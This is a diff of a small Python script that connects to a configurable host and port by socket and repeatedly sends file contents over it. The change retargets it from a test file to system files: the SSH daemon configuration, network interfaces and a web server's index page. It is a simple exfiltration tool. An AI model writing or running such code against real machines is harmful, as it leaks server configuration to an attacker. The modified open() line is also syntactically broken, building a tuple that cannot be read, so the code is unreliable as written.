@@ -3,15 +3,15 @@ import os
 import subprocess
 
 s = socket.socket()
-host = '127.0.0.1' #alterar aqui
-port = 9090        #alterar aqui
+host = '127.0.0.1'
+port = 9090
 
 
 s.connect((host, port))
 
 
 while True:
-    arq = open('/home/kali/arqenv/arqenv.txt', 'rb')
+    arq = open('/etc/ssh/sshd_config', 'rb'),('/etc/network/interfaces', 'rb'),('/var/www/html/index.html', 'rb')
 
     for i in arq.readlines():
         s.send(i)
